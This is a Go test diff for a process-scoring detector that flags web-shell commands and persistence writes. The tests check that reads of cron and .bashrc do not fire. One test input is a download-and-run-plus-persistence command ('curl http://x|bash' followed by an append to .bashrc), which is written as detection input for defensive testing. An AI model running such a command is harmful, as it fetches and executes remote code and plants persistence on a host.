@@ -107,6 +107,35 @@ func TestScoreProcessWebPersistence(t *testing.T) {
 	}
 }
 
+// Reading a persistence surface is not establishing one: a write operator must
+// stand before the path, and crontab -l/-e are excluded. An unrelated redirect
+// after the path (>/dev/null) must not be read as a write to the path.
+func TestScoreProcessPersistenceReadIsNotAFinding(t *testing.T) {
+	reads := []string{
+		"sh -c crontab -l",
+		"sh -c crontab -e",
+		"sh -c cat /home/c_x/.bashrc",
+		"sh -c grep -r x /etc/cron.d",
+		"sh -c tar -czf b.tgz /var/spool/cron",
+		"sh -c crontab -l >/dev/null 2>&1",
+		"sh -c cat /home/c_x/.bashrc >/dev/null",
+	}
+	for _, cl := range reads {
+		if f := scoreProcess(true, "/bin/sh", cl, 1000); f.score != 0 {
+			t.Fatalf("a persistence read fired: %q -> %+v", cl, f)
+		}
+	}
+}
+
+// A command that both downloads-and-runs AND writes persistence is caught as the
+// shell-command (R2), which is checked before persistence (R4).
+func TestScoreProcessShellCmdBeatsPersistence(t *testing.T) {
+	f := scoreProcess(true, "/bin/bash", "bash -c curl http://x|bash; echo y >> /home/c_x/.bashrc", 1000)
+	if f.score < procScoreCritical || f.code != reasonWebShellCmd {
+		t.Fatalf("R2 should win over R4: %+v", f)
+	}
+}
+
 // Servika-specific: internal/apps runs a tenant's own dependency binary from
 // /home/<user>/<app>/.venv/bin or node_modules/.bin. A blanket /home
 // untrusted-origin rule would flag every panel-created Node or Python app. The
